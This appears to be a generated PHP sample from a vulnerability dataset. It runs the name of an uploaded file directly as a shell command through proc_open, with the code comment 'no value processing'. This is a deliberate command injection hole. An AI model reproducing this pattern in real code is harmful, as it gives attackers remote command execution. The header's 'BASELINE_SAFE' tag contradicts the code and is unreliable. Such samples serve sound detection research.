<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=FILE_UPLOAD; CE_MODE=FILES_NAME_AKE; SKELETON=S2; KEY=cmd; SINK=B5; VAR=v0086 */
function SINK_B5($command){
    $process = proc_open($command, [["pipe", "r"], ["pipe", "w"]], $pipes);
            if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[0]);
            proc_close($process);
            echo $output;
}
}
$f = $_FILES["cmd"] ?? null;
$inp = (is_array($f) && array_key_exists("name", $f)) ? (string)$f["name"] : "";
$inp = (string)$inp; // no value processing
class Runner {
    public static function run($x){
        return SINK_B5($x);
    }
}
$out = Runner::run($inp);
echo (string)($out);
?>
